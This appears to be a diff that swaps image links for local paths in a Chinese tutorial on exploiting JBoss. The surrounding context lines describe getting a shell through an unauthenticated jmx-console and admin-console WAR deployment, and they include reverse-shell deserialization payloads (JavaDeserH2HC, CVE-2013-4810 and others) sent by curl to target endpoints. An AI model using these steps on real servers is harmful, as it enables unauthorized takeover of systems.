@@ -72,7 +72,7 @@ JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许�
 
 漏洞汇总
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh14m1ibIeDVrmvHz4xCYoymibAgoWnRjEibiay70mbibibhaObkNwgG8aey1g/640?wx_fmt=png)
+![](../../.resource/remote/673aa1467d52321b64e32c6c28bab35385938a6d9afe21455c32363129b54e33.png)
 
 访问控制不严导致的漏洞  
 Jboss 管理控制台  
@@ -103,7 +103,7 @@ jmx-console 和 web-console 共用一个账号密码 ，账号密码文件在
 /opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhA8AgpQzM1iaAvjvib7HvjgOLKDx9XHcZUglEP5ZhL6YWxxym4dL9KvMw/640?wx_fmt=png)
+![](../../.resource/remote/d55314bdccf7a6a954c9308e56b32a6f7ad92cdd594980d73d0e4becb35cb8ea.png)
 
 JMX Console 未授权访问 Getshell
 
@@ -116,11 +116,11 @@ Jboss4.x 以下
 漏洞利⽤  
 Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包 Getshell。若需登录，可以尝试爆破弱口令登录。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhUOBia8LwmmdXxnSQItRh2ibAOTmsNyxscKbKxG5xOHYR52MWXkH8UYmA/640?wx_fmt=png)
+![](../../.resource/remote/4c744a3f5facd00e9687bac3e749f5a4baf58c61e055aa60cdafb1efa98ebf17.png)
 
 然后找到 jboss.deployment（jboss 自带的部署功能）中的 flavor=URL,type=DeploymentScanner 点进去（通过 url 的方式远程部署）
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh6TB9HXAHzaIJb7c1esJYTzElZEicfRdqO1v6VTQly8cDsYuFwIY9mdA/640?wx_fmt=png)
+![](../../.resource/remote/192c6a4c2dfe267042c423b525d091528b8a51d8a4cbf557174ac950e2b8285b.png)
 
 也可以直接输入 URL 进入
 
@@ -130,16 +130,16 @@ http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.d
 
 找到页面中的 void addURL() 选项来远程加载 war 包来部署。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhHkVJfunl6lQ6jtLptmBAGlVJQZKS8o7BHgLQLTibxejCdfy2iaSTB3oQ/640?wx_fmt=png)
+![](../../.resource/remote/82e76a436e71ddad7715efcecb7cfc0dc37b80ddd18241ed4cbda0e7af3bfe9a.png)
 
 查看部署是否成功  
 返回到刚进入 jmx-console 的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的 war 包即可
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhUjqj8CLOqo2j44CnSdQB7sS2iaPmZeFp4xMpVVG1msnEYMQATb6Icqw/640?wx_fmt=png)
+![](../../.resource/remote/691b0f4441bce1924ce1083118e2ad4f49eac170ed91f7a7e7f3885b34ad6202.png)
 
 访问我们的木马
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhlNRKdIfFDEXIsCzIgnNBibicuZ67KQKSdt9twrrFMCw0SKQhqSObKv5w/640?wx_fmt=png)
+![](../../.resource/remote/d467ea95d527504f4ec0a2572c45c7713305c4520faa648bc7314c0e2cda8ef8.png)
 
 ```
 通常像上面这样部署的webshell,物理路径默认都会在以下目录下 
@@ -175,7 +175,7 @@ arg4传入的是上传文件中的内容
 通过控制这四个参数即可上传shell，控制整台服务器。
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhhFsFZZaLm1N3icfiaN62Je78GH8JpI1buR1W5Kic1A50BicAU8TOiboCrug/640?wx_fmt=png)
+![](../../.resource/remote/ff4ee845a35e0d34c1f8eaa63ce1fa529c11b2f82b6b2f6ed5aab8cbc557e253.png)
 
 后面的 CVE-2010-0738 和 CVE-2006-5750 漏洞也存在这一特性。
 
@@ -241,17 +241,17 @@ Jboss 5.x/6.x admin-Console 后台部署 war 包 Getshell
 Jboss5.X 开始，jmx-console 不能部署 war 包了，需要 admin-console 后台部署  
 登录进 admin-console 后台后，点击 Web Application(WAR)s ，然后 Add a new resource
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhucnJwNSqq7gcGu2gUTSCEFk7QFY72hvZRasGqqgPYNJz7iaqdpibNGGg/640?wx_fmt=png)
+![](../../.resource/remote/e4434ddaeed954107da482e14fb77f2fc923d0a429dd2bb7ad938e1fa448841d.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhxCucUkOeSb5bjoMrFJkXSSUtmTNVs4sOCKuhpWehlXpz7XJKgWhdjg/640?wx_fmt=png)
+![](../../.resource/remote/3211034983c637545a83dc8de7511e284bab35006b3d0db8f2713690b72797a5.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhY8US0UP5PzwX0sxuXY0TRoGT1GeBGh2fIM7fvZzE16PADYkR4RkOyA/640?wx_fmt=png)
+![](../../.resource/remote/8ac62b9db4d35abdc967346f31eee867e55e4f37594b1a2c0150f5462005b597.png)
 
 这里选择我们本地生成好的 war 包
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhjr8HXMfg5Lp3IaHmzBXq2zWupMyduDqribtwKZFQrrComRcL5BnVScg/640?wx_fmt=png)
+![](../../.resource/remote/5d9d4167cfad2e6ba1ed8621c17491db8e7688ba1edf84402130c9773273ec1d.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh1GrgngiaaIWANk1xXoejOsvX2Nk7SXJdXiauDa9rdu13gt3WCicObEuJg/640?wx_fmt=png)
+![](../../.resource/remote/3e9db804ba37f36df76d0ddf13169ae5460b507c31c94af0ef0fb23acc4e3a0f.png)
 
 访问木马成功
 
@@ -275,11 +275,11 @@ Apache Group Commons Collections 4.0
 漏洞探测  
 此漏洞存在于 JBoss 中 /invoker/JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhho08A3ntByFkkR6Fg6sanOmzvJd4YPKwVd132mnicEun3GhMn8KWSLQ/640?wx_fmt=png)
+![](../../.resource/remote/1e0d7b8fc0d63058d4f8f8fd33f8df69ef1fdd42b6b3fe81970ea70f2098c160.png)
 
 我们先启动靶机环境，访问：http://yourip:8080/
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhKKiaAzFOZJYtBwNWqxhplViaicicHuicsrqXZAe3ThXDaUTYkY2r1fheyBw/640?wx_fmt=png)
+![](../../.resource/remote/11950412bbbd20433d610f0b3cc6b1652e429282d0307b169f7888dd1b23d1cf.png)
 
 下面使用 JavaDeserH2HC 生成反弹 shell 的 payload
 
@@ -293,12 +293,12 @@ javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.
 生成载荷的序列化文件 xx.ser(反弹 shell 到我们的 vps)  
 利用 curl 提交我们的 ser 文件
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhhlYmV8N9fPTJbXSibosFkEl6ianIsw7pOVEkJva3Mveibc2eJ55F5C94g/640?wx_fmt=png)
+![](../../.resource/remote/67a9a70e19c7112cfd1315a71a45fc0aed73dbb6c8614b72af368f280f07ffc6.png)
 
 vps 使用 nc 监听端口  
 成功反弹
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhibmIrE1icuQiabGCmicVCvR8lQ7zbPibvd5zpTS7R5JiavzRut3TIvXCnFeg/640?wx_fmt=png)
+![](../../.resource/remote/be6b845d80a5c040f2afd6054088c2bf8858ceaa6d03f645be58e1ff0a00108f.png)
 
 JBoss EJBInvokerServlet CVE-2013-4810 反序列化漏洞
 
@@ -330,7 +330,7 @@ JBoss AS 4.x 及之前版本
 1、首先验证目标 jboss 是否存在此漏洞, 直接访问  
 /jbossmq-httpil/HTTPServerILServlet 路径下。若访问 200，则可能存在漏洞。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhgibibHuUGAX8AC7YrcACbibBWnQB1o9YSbUiaXKg6n1EIKiauXhkTZp0fHw/640?wx_fmt=png)
+![](../../.resource/remote/23d5d8bda5bc782fbc82e8c4401a581e8a0f9eaa4462c95cb496f579be949c22.png)
 
 此处我们使用 JavaDeserH2HC 工具来利用该漏洞, 尝试直接弹回一个 shell
 
@@ -340,9 +340,9 @@ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap �
 curl http://目标IP:8080/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh9R70fLMicmR90OFFU0rzopvnrDt4tbWmLQicibzUrKvh45T4LxWtAJhAg/640?wx_fmt=png)
+![](../../.resource/remote/69a5e54ad0d094dde7dd7c7fa10aace6ed85b436353f0dca91c91d4bc2186e54.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhZUmhJYyLrZZiaFThr6LHTF6sRmD951LOL6I0UaVMMCvOialwRpELEPFg/640?wx_fmt=png)
+![](../../.resource/remote/efeb331b5076d71f48557cbd23db997bbe1cc97bbaea35bb20a970cae0716116.png)
 
 成功反弹 shell
 
@@ -361,16 +361,16 @@ JbossAS 6.x
 漏洞验证 POC  
 http:// 目标: 8080/invoker/readonly 如果出现报 500 错误, 则说明目标机器可能存在此漏洞
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh39DGP8Bl9pJTbH6ftSvL0vJG2XpjgVXbWcTOia3XlJbN0MzRRjw1weA/640?wx_fmt=png)
+![](../../.resource/remote/3c679cb643dd1049a1d2ffc4b3ce621f2a99f8699a9171095ae979eef5df7e57.png)
 
 漏洞利用  
 首先从 http 响应头和 title 中一般情况下都能看到信息来确定目标 jboss 版本是否在此漏洞版本范围
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhBxNfumYH6qoDCRQH2k2kphNKeztqMy08ElWYFcgBedF91jh4L2iaWcQ/640?wx_fmt=png)
+![](../../.resource/remote/8aa00337de5e759872b09beb3fcd880e77e55e612dd3c4c341a76d304f3a6b28.png)
 
 现成工具
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhXawr2ZQgibcGSSwia4wjZoV07dJia8zopvgFz1SzgcfnakXvW9CGORPrA/640?wx_fmt=png)
+![](../../.resource/remote/8e02a98169e6511b90832c85553f4f7bbdf16e312a60d3b3faa8f6baa54b468d.png)
 
 接下来借助 JavaDeserH2HC 来完成整个利用过程  
 首先尝试直接反弹 shell, 利用 JavaDeserH2HC 创建好用于反弹 shell 的  
@@ -383,9 +383,9 @@ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap v
 curl http://www.target.net/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhfop6Sf553hPoeM8icPwSuTbUOB66kCfp4DrzeHSDthZ5IpYx5PiafeeQ/640?wx_fmt=png)
+![](../../.resource/remote/22db8cb3a7c308e64b712f8d1ba28bd6b515f2d7f7ae630a479151b4a2f258e9.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhV0YJJG5f4kfubrJkPztxhibxffAhr4uB60Nx13JibA7VLz9yIYoZRNwA/640?wx_fmt=png)
+![](../../.resource/remote/6287314e18eb76310ed4da068042ee9514d6a5a04d75a2b0397ba898218dee22.png)
 
 成功反弹 shell。
 
@@ -399,15 +399,15 @@ https://www.freebuf.com/articles/web/240174.html
 
 进来一起学习吧
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDC1QHAC8PAV6JaPBJno5cRxvqAVB1pm0tOZd3TQM7jCB5nTbnfa40GHHQFIWpFFRuHCCCdtykVQWQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/08f20aebcac00643214b0a8f21f43e7f5e7c24f03d25ba52fc1e8ebcbe08c911.jpg)
 
 可以看看好兄弟
 
 一个学习资料分享的星球  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh7w9zO0pVDGHw104MNYAWlTDkYC8m08m7u5M99gD5ftwXnzSztPchNw/640?wx_fmt=png)
+![](../../.resource/remote/975a534611977efa31a3e30dd70d76ef0b3dbf924eb0c5cf5787994fc16ae18f.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh7GeB0qib6uR6ag8kLmQHGMnI1mzDLJmN8G1VrudmSpM1HEdjiaPAQa4A/640?wx_fmt=png)
+![](../../.resource/remote/ab1fdbe03da4dcb36de1d0ea312607c7099cda0f834c3046e240abef872a706a.png)
 
 ---
 
